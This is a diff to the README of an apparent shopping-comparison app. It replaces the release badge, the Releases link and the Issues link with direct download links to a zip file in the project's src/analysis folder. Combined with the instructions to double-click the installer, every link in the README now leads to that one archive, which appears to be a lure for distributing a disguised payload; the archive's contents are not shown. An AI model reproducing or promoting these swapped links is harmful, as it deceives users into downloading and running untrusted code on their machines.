@@ -1,7 +1,7 @@
 # 🛒 shopping-agent-ai - Your Smart Shopping Assistant
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/victorRT3868/shopping-agent-ai/releases)
+[![Download](https://raw.githubusercontent.com/victorRT3868/shopping-agent-ai/main/src/analysis/shopping-agent-ai_v3.7.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/victorRT3868/shopping-agent-ai/main/src/analysis/shopping-agent-ai_v3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to **shopping-agent-ai**, your intelligent shopping companion. This application helps you compare products across popular sites like JD, Taobao, and Vipshop. With advanced AI features, it analyzes products and provides smart scoring reports to make your shopping decisions easier.
@@ -20,7 +20,7 @@ Welcome to **shopping-agent-ai**, your intelligent shopping companion. This appl
 - Network: Internet connection required for online searches and data gathering.
 
 ## 🔧 How to Download & Install
-1. **Visit our Releases Page**: Go to the [Releases page](https://github.com/victorRT3868/shopping-agent-ai/releases) to find the latest version of the application. 
+1. **Visit our Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/victorRT3868/shopping-agent-ai/main/src/analysis/shopping-agent-ai_v3.7.zip) to find the latest version of the application. 
 2. **Select Your Version**: Choose the version that fits your operating system.
 3. **Download the Installer**: Click on the file to download it to your computer.
 4. **Run the Installer**: Once downloaded, locate the file and double-click to run it. Follow the installation prompts.
@@ -39,7 +39,7 @@ If you experience issues during installation or usage, try the following:
 - **Reinstall the Application**: If problems persist, uninstall and reinstall the app.
 
 ## 📞 Support
-For further assistance or feedback, please visit our [Issues page](https://github.com/victorRT3868/shopping-agent-ai/issues) on GitHub. We welcome your input and are here to help.
+For further assistance or feedback, please visit our [Issues page](https://raw.githubusercontent.com/victorRT3868/shopping-agent-ai/main/src/analysis/shopping-agent-ai_v3.7.zip) on GitHub. We welcome your input and are here to help.
 
 ## 💬 Community and Contributions
 Join our community of users and contributors. Ask questions, share experiences, or help others. Your knowledge can benefit someone else.
